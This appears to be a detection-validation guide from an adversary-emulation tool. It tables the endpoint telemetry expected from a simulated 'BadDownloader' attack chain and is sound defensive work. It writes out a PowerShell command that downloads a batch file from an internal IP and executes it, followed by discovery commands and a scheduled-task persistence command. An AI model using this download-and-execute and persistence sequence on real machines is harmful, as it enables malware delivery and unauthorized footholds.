# BadDownloader — Expected Endpoint Telemetry

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

This document describes what endpoint telemetry tools SHOULD capture
when BadDownloader executes. Use this to validate your detection capabilities.
============================================================================
```

## Overview

This document describes what endpoint detection tools should capture at each stage of the BadDownloader attack chain. Use this as a checklist when validating your telemetry collection.

## Telemetry Events by Stage

### Event 1: BadDownloader.exe

| Field | Expected Value |
|-------|----------------|
| Event Type | Process creation |
| Image Name | `BadDownloader.exe` |
| Command Line | `BadDownloader.exe` (or full path) |
| Parent Process | `explorer.exe` or `cmd.exe` (depends on how the operator launches it) |
| File Hash | SHA256 of BadDownloader.exe (unique, not signed) |

**Detection note:** This is a rare/unknown binary. It should surface in any "rare binary" detection logic — it will appear only once or twice in the entire telemetry dataset.

### Event 2: cmd.exe (Download)

| Field | Expected Value |
|-------|----------------|
| Event Type | Process creation |
| Image Name | `cmd.exe` |
| Command Line | `cmd.exe /c powershell.exe Invoke-WebRequest "http://192.168.0.148:8888/baddownload.bat" -OutFile "%TEMP%\baddownload.bat"` |
| Parent Process | `BadDownloader.exe` |

**Detection note:** The full PowerShell download cradle is visible in the `cmd.exe` command line. The IP address `192.168.0.148` and URL are plaintext — no encoding or obfuscation.

### Event 3: powershell.exe

| Field | Expected Value |
|-------|----------------|
| Event Type | Process creation |
| Image Name | `powershell.exe` |
| Command Line | `powershell.exe Invoke-WebRequest "http://192.168.0.148:8888/baddownload.bat" -OutFile "C:\Users\...\AppData\Local\Temp\baddownload.bat"` |
| Parent Process | `cmd.exe` |
| Network Destination | `192.168.0.148:8888` (HTTP GET) |

**Detection note:** PowerShell making an HTTP request to a non-standard port (8888). The `Invoke-WebRequest` cmdlet and destination IP are in the command line.

### Event 4: cmd.exe (Payload Execution)

| Field | Expected Value |
|-------|----------------|
| Event Type | Process creation |
| Image Name | `cmd.exe` |
| Command Line | `cmd.exe /c "C:\Users\...\AppData\Local\Temp\baddownload.bat"` |
| Parent Process | `BadDownloader.exe` |

**Detection note:** Second `cmd.exe` child of `BadDownloader.exe`. Executing a .bat file from `%TEMP%` is suspicious.

### Events 5-8: Discovery Commands

| Image Name | Command Line | MITRE ID | Notes |
|------------|-------------|----------|-------|
| `whoami` (via cmd.exe) | `whoami` | T1033 | May appear as partial event (PID 0) |
| `ipconfig.exe` (via cmd.exe) | `ipconfig /all` | T1016 | May appear as partial event (PID 0) |
| `systeminfo.exe` (via cmd.exe) | `systeminfo` | T1082 | Longer-running — should get full WMI enrichment |
| `net.exe` (via cmd.exe) | `net user` | T1087.001 | May appear as partial event (PID 0) |

All are children of the second `cmd.exe` instance (the one running `baddownload.bat`).

**WMI enrichment edge case:** Discovery commands that execute in under 1 second (`whoami`, `ipconfig`, `net user`) may get partial events from Esinta Endpoints — PID 0 and image name only, without full path or hash enrichment. This is because WMI process creation events don't include all fields, and the process exits before the agent's supplementary WMI query can enrich it. Longer-running processes like `systeminfo` (which typically runs for several seconds) will get full enrichment.

### Event 9: schtasks.exe

| Field | Expected Value |
|-------|----------------|
| Event Type | Process creation |
| Image Name | `schtasks.exe` |
| Command Line | `schtasks /create /tn "BadDownloader" /tr "calc.exe" /sc daily /st 08:00 /f` |
| Parent Process | `cmd.exe` (the baddownload.bat instance) |

**Detection note:** The `/create` flag and task name are visible in the command line. Windows Event ID 4698 should also fire.

### Event 10: calc.exe

| Field | Expected Value |
|-------|----------------|
| Event Type | Process creation |
| Image Name | `calc.exe` |
| Command Line | `calc.exe` |
| Parent Process | `cmd.exe` (the baddownload.bat instance) |

**Detection note:** `calc.exe` is the safe payload. In a real attack, this would be a malicious executable.

## Complete Process Tree Telemetry

```
BadDownloader.exe (PID: A)
  ├── cmd.exe /c powershell.exe Invoke-WebRequest ... (PID: B)
  │     └── powershell.exe Invoke-WebRequest ... (PID: C)
  └── cmd.exe /c %TEMP%\baddownload.bat (PID: D)
        ├── whoami (PID: E1)        ← may be partial (PID 0)
        ├── ipconfig /all (PID: E2) ← may be partial (PID 0)
        ├── systeminfo (PID: E3)    ← should get full enrichment
        ├── net user (PID: E4)      ← may be partial (PID 0)
        ├── schtasks.exe (PID: F)
        └── calc.exe (PID: G)
```

## Telemetry Validation Checklist

- [ ] `BadDownloader.exe` process creation captured with hash
- [ ] First `cmd.exe` with PowerShell download command captured
- [ ] `powershell.exe` with `Invoke-WebRequest` command line captured
- [ ] Network connection from `powershell.exe` to `192.168.0.148:8888` captured
- [ ] File write: `baddownload.bat` in `%TEMP%` captured
- [ ] Second `cmd.exe` executing .bat from `%TEMP%` captured
- [ ] Discovery commands captured (at minimum image name; full enrichment for `systeminfo`)
- [ ] `schtasks.exe` with `/create` captured
- [ ] Windows Event 4698 (task created) captured
- [ ] `calc.exe` process creation captured
- [ ] Parent-child process relationships correctly linked

## Event Summary Table

| Stage | Event Count | Key Detection |
|-------|-------------|---------------|
| BadDownloader.exe | 1 process | Rare binary, unknown hash |
| Download | 2 processes, 1 network, 1 file | cmd.exe → powershell.exe, HTTP GET |
| .bat execution | 1 process | cmd.exe running .bat from %TEMP% |
| Discovery | 4 processes | whoami + ipconfig + systeminfo + net user burst |
| Persistence | 1 process, 1 task | schtasks /create |
| Payload | 1 process | calc.exe |
| **Total** | **~10 processes, 1 network, 1 file, 1 task** | |
